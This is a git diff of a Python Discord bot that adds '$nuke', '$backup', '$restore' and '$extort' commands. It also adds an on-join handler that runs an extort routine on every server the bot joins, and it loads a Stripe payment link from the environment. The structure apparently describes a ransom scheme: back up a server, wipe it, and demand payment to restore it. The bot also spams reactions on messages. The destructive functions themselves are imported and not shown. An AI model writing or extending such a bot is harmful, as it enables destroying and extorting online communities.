@@ -1,26 +1,50 @@
-import os
 from nuke import *
-
-token = os.getenv('token')
+import os
+token, payment_link = os.getenv('token'), os.getenv('stripe_link')
 intents = discord.Intents.default()
 intents.members, intents.message_content = True, True
-client = discord.Client(intents=intents)
+bot = commands.Bot(command_prefix='$', intents=intents)
 
 
-@client.event
+@bot.event
 async def on_ready():
-    print(f'We have logged in as {client.user}')
+    print(f'We have logged in as {bot.user}')
 
 
-@client.event
+@bot.command(name='nuke')
+async def nuke_command(ctx):
+    if b_nuke_on_command:
+        await nuke(ctx.channel.guild)
+    else:
+        await ctx.send('no')
+
+
+@bot.command(name='backup')
+async def backup_command(ctx):
+    if b_backup_on_command:
+        await backup(ctx.channel.guild)
+    else:
+        await ctx.send('no')
+
+
+@bot.command(name='restore')
+async def restore_command(ctx):
+    if b_restore_on_command:
+        await restore(ctx.channel.guild)
+    else:
+        await ctx.send('no')
+
+
+@bot.command(name='extort')
+async def extort_command(ctx):
+    if b_extort:
+        await extort(ctx.channel.guild)
+    else:
+        await ctx.send('no')
+
+
+@bot.event
 async def on_message(message):
-    if b_nuke_on_command and message.content.startswith('$nuke'):
-        await nuke(message.channel.guild)
-    if b_backup_on_command and message.content.startswith('$backup'):
-        await backup(message.channel.guild)
-    if b_restore_on_command and message.content.startswith('$restore'):
-        await restore(message.channel.guild)
-
     if b_spam_reacts:
         reactions = ['😂', '🤐', '😏']
         for reaction in reactions:
@@ -29,14 +53,14 @@ async def on_message(message):
             except discord.errors.NotFound:
                 return
 
+    await bot.process_commands(message)  # Needed because we have code in our on_message it seems
 
-@client.event
+
+@bot.event
 async def on_guild_join(guild):
-    if b_backup_on_join:
-        await backup(guild)
-    if b_nuke_on_join:
-        await nuke(guild)
+    if b_extort:
+        await extort(guild)
 
 
 if __name__ == '__main__':
-    client.run(token=token)
+    bot.run(token=token)
